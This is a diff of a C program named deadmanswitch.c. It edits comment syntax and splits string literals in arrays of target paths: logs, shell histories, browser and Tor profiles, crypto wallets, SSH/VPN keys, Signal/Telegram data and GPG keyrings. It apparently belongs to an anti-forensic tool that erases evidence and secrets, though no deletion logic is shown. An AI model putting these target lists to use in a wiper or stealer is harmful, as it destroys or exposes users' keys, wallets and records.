@@ -1,5 +1,5 @@
-# Compile:
-#gcc -o deadmanswitch deadmanswitch.c -lcrypto
+// Compile:
+//gcc -o deadmanswitch deadmanswitch.c -lcrypto
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -31,13 +31,13 @@ static const char *LOG_DIRS[] = {
     "/var/lib/syslog",
     "/var/tmp",
     "/tmp",
-    "/home/*/.bash_history",
-    "/home/*/.zsh_history",
-    "/home/*/.wget-hsts",
-    "/home/*/.python_history",
-    "/home/*/.config/google-chrome",
-    "/home/*/.mozilla/firefox",
-    "/home/*/.tor-browser",
+    "/home/*" "/.bash_history",
+    "/home/*" "/.zsh_history",
+    "/home/*" "/.wget-hsts",
+    "/home/*" "/.python_history",
+    "/home/*" "/.config/google-chrome",
+    "/home/*" "/.mozilla/firefox",
+    "/home/*" "/.tor-browser",
     "/root/.bash_history",
     "/root/.zsh_history",
     "/root/.wget-hsts",
@@ -47,13 +47,13 @@ static const char *LOG_DIRS[] = {
 };
 
 static const char *WALLET_DIRS[] = {
-    "/home/*/.bitcoin",
-    "/home/*/.electrum",
-    "/home/*/.monero",
-    "/home/*/.atomic",
-    "/home/*/.ethereum",
-    "/home/*/.litecoin",
-    "/home/*/.dogecoin",
+    "/home/*" "/.bitcoin",
+    "/home/*" "/.electrum",
+    "/home/*" "/.monero",
+    "/home/*" "/.atomic",
+    "/home/*" "/.ethereum",
+    "/home/*" "/.litecoin",
+    "/home/*" "/.dogecoin",
     "/root/.bitcoin",
     "/root/.electrum",
     "/root/.monero",
@@ -67,9 +67,9 @@ static const char *WALLET_DIRS[] = {
 static const char *VPN_SSH_DIRS[] = {
     "/etc/openvpn",
     "/etc/ssh",
-    "/home/*/.ssh",
+    "/home/*" "/.ssh",
     "/root/.ssh",
-    "/home/*/.openvpn",
+    "/home/*" "/.openvpn",
     "/root/.openvpn",
     "/var/lib/NetworkManager",
     "/etc/NetworkManager/system-connections",
@@ -87,29 +87,29 @@ static const char *CRON_DIRS[] = {
 };
 
 static const char *MESSAGING_DIRS[] = {
-    "/home/*/.TelegramDesktop",
-    "/home/*/.config/Signal",
+    "/home/*" "/.TelegramDesktop",
+    "/home/*" "/.config/Signal",
     "/root/.TelegramDesktop",
     "/root/.config/Signal",
     NULL
 };
 
 static const char *PGP_GPG_DIRS[] = {
-    "/home/*/.gnupg",
+    "/home/*" "/.gnupg",
     "/root/.gnupg",
     NULL
 };
 
 static const char *LIBREOFFICE_DIRS[] = {
-    "/home/*/.config/libreoffice",
+    "/home/*" "/.config/libreoffice",
     "/root/.config/libreoffice",
     NULL
 };
 
 static const char *TORRENT_DIRS[] = {
-    "/home/*/.config/qBittorrent",
-    "/home/*/.config/deluge",
-    "/home/*/.config/transmission",
+    "/home/*" "/.config/qBittorrent",
+    "/home/*" "/.config/deluge",
+    "/home/*" "/.config/transmission",
     "/root/.config/qBittorrent",
     "/root/.config/deluge",
     "/root/.config/transmission",
